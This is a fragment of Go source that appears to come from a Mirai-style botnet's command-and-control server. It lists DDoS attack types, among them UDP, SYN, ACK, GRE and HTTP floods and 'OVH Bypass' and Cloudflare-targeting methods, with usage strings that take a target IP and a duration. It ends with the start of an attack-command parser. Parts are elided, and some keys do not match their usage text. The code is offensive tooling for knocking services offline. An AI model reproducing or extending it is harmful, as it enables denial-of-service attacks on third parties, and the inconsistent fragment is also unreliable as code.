...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "udpplain": AttackInfo {
        ...
        "Raw UDP Flood. Usage : /udp [IP] [TIME] [len=1024]",
    },
	"std": AttackInfo {
        2,
        []uint8 { 0, 6, 7 },
	...
	"vse": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve Source Engine Flood. Usage : /vse [IP] [TIME]",
	},
	"syn": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "SYN Flood. Usage : /syn [IP] [TIME]",
    },
    "/": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "TCP FLood using all Flags. Usage : /tcpall [IP] [TIME]",
    },   
	"ovh": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "OVH Bypass. Usage : ovh [IP] [TIME]",
    },
    "TCP": AttackInfo {
        8,
        []uint8 { 2, 7, 9, 5, 6, 7, 11, 12, 33, 14, 27 },
        "TCP Flood. Usage : TCP [IP] [TIME]",
    },
    ".": AttackInfo {
        8,
        []uint8 { 0, 1, 7 },
        ". Custom Flood. Usage : . [IP] [TIME]",
    },
    "cloudflare": AttackInfo {
        8,
        []uint8 { 8, 7, 20, 21, 22, 24 },
        "Cloudflare Test. Usage : /cf [IP] [TIME] [domain=IP] [conns=5000]",
    },
	"hex": AttackInfo {
        9,
        []uint8 { 0, 6, 7 },
        "STD Flood. Usage : /hex [IP] [TIME] sport=[PORT]",
    },
	 "xmas": AttackInfo {
        12,
        []uint8 { 0, 6, 7 },
        "XMAS Flood. Usage : /xmas [IP] [TIME]",
    },
    "http": AttackInfo {
        10,
        []uint8 {8, 7, 20, 21, 22, 24},
        "HTTP Flood. Usage : /http [IP] [TIME] [domain=IP] [conns=5000]",
    },
    "greip": AttackInfo {
        6,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE IP Flood. Usage : greip [IP] [TIME]",
    },
    "raw": AttackInfo {
        7,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE Ethernet Flood. Usage : /greeth [IP] [TIME]",
	},
    "ovh2": AttackInfo {
        8,
        []uint8 { 2, 7, 9, 5, 6, 7, 11, 12, 33, 14, 27 },
        "OVH Flood. Usage : ovh2 [IP] [TIME]",
    },
    "ack": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ACK Flood. Usage : /ack [IP] [TIME]",
    },
}
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if err != nil || duration == 0 || duration > 99999999999 {
